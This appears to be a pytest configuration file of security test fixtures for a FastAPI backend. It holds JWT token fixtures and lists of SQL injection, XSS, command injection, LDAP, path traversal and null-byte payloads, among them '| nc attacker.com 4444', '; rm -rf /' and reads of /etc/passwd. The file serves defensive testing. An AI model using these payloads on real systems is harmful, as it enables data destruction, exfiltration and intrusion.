"""Pytest configuration for security tests."""
import pytest
import sys
import os
from pathlib import Path

# Add backend to path for imports
backend_path = Path(__file__).parent.parent.parent
if str(backend_path) not in sys.path:
    sys.path.insert(0, str(backend_path))

import jwt
from datetime import datetime, timedelta
from fastapi.testclient import TestClient


@pytest.fixture
def jwt_secret():
    """JWT secret key for token generation"""
    return "test-jwt-secret-key-for-security-testing"


@pytest.fixture
def jwt_algorithm():
    """JWT algorithm"""
    return "HS256"


@pytest.fixture
def valid_jwt_token(jwt_secret, jwt_algorithm):
    """Generate a valid JWT token"""
    payload = {
        "user_id": 1,
        "email": "test@example.com",
        "exp": datetime.utcnow() + timedelta(hours=24)
    }
    return jwt.encode(payload, jwt_secret, algorithm=jwt_algorithm)


@pytest.fixture
def expired_jwt_token(jwt_secret, jwt_algorithm):
    """Generate an expired JWT token"""
    payload = {
        "user_id": 1,
        "email": "test@example.com",
        "exp": datetime.utcnow() - timedelta(hours=1)
    }
    return jwt.encode(payload, jwt_secret, algorithm=jwt_algorithm)


@pytest.fixture
def malformed_jwt_token():
    """Return a malformed JWT token"""
    return "not.a.valid.token.at.all"


@pytest.fixture
def invalid_jwt_signature(jwt_secret, jwt_algorithm):
    """Generate JWT token with invalid signature"""
    payload = {
        "user_id": 1,
        "email": "test@example.com",
        "exp": datetime.utcnow() + timedelta(hours=24)
    }
    token = jwt.encode(payload, jwt_secret, algorithm=jwt_algorithm)
    # Tamper with the signature
    parts = token.split(".")
    parts[2] = "invalidsignature"
    return ".".join(parts)


@pytest.fixture
def admin_token(jwt_secret, jwt_algorithm):
    """Generate an admin JWT token"""
    payload = {
        "user_id": 99,
        "email": "admin@example.com",
        "role": "admin",
        "exp": datetime.utcnow() + timedelta(hours=24)
    }
    return jwt.encode(payload, jwt_secret, algorithm=jwt_algorithm)


@pytest.fixture
def user_token(jwt_secret, jwt_algorithm):
    """Generate a regular user JWT token"""
    payload = {
        "user_id": 1,
        "email": "user@example.com",
        "role": "user",
        "exp": datetime.utcnow() + timedelta(hours=24)
    }
    return jwt.encode(payload, jwt_secret, algorithm=jwt_algorithm)


@pytest.fixture
def sql_injection_payloads():
    """Common SQL injection payloads for testing"""
    return [
        "' OR '1'='1",
        "' OR 1=1 --",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "admin' --",
        "' OR '1'='1' /*",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "'; DELETE FROM users; --",
        "' OR 'a'='a",
    ]


@pytest.fixture
def xss_payloads():
    """Common XSS payloads for testing"""
    return [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "javascript:alert('xss')",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<body onload=alert('xss')>",
        "<input onfocus=alert('xss') autofocus>",
        "<select onfocus=alert('xss') autofocus>",
        "<textarea onfocus=alert('xss') autofocus>",
        "<marquee onstart=alert('xss')>",
    ]


@pytest.fixture
def command_injection_payloads():
    """Common command injection payloads"""
    return [
        "; ls -la",
        "| whoami",
        "` whoami `",
        "$(whoami)",
        "&& cat /etc/passwd",
        "| nc attacker.com 4444",
        "; rm -rf /",
        "| python -c 'import os; os.system(\"whoami\")'",
    ]


@pytest.fixture
def ldap_injection_payloads():
    """LDAP injection payloads"""
    return [
        "*",
        "*)(uid=*",
        "admin*",
        "*)(mail=*",
        "admin)(&",
    ]


@pytest.fixture
def path_traversal_payloads():
    """Path traversal payloads"""
    return [
        "../../../etc/passwd",
        "../../.env",
        "..\\..\\..\\windows\\system32",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
    ]


@pytest.fixture
def large_payload():
    """Large payload for buffer overflow testing"""
    return "A" * (1024 * 1024)  # 1MB


@pytest.fixture
def null_byte_payloads():
    """Null byte injection payloads"""
    return [
        "file.txt%00.jpg",
        "file.txt\x00.jpg",
        "test\x00admin",
    ]
